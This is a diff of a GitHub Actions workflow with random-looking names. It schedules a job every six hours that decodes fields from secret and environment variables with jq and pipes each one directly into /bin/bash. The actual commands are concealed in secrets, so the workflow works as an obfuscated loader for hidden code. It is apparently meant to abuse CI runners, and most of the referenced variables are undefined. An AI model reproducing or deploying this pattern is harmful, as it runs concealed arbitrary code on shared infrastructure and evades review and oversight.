@@ -1,19 +1,24 @@
 name: zhongpingcui1234
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 0/6 * * *'
-jobs:  # 19705
+    - cron: '42 3/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: zhongpingcui1234
         env:
-          c83: ${{ secrets.c83 }}
+          hu1668: ${{ secrets.hu1668 }}
         run: |
-          echo $c83 | jq -r .mh1048 | /bin/bash
-          echo $cqg7587 | jq -r .ebq737 | /bin/bash
-          echo $ppi82 | jq -r .ek35145 | /bin/bash
+          echo $hu1668 | jq -r .jd3 | /bin/bash
+          echo $gfifp6 | jq -r .sdjg01489 | /bin/bash
+          echo $mi001 | jq -r .rgaal0 | /bin/bash
+          echo $z999 | jq -r .toaca79496 | /bin/bash
+          echo $nqn400 | jq -r .wma325 | /bin/bash
+          echo $yk07435 | jq -r .zco029 | /bin/bash
+          echo $wyoj74 | jq -r .zkbhs222 | /bin/bash
+          echo $udavi8515 | jq -r .pglyv02989 | /bin/bash
 
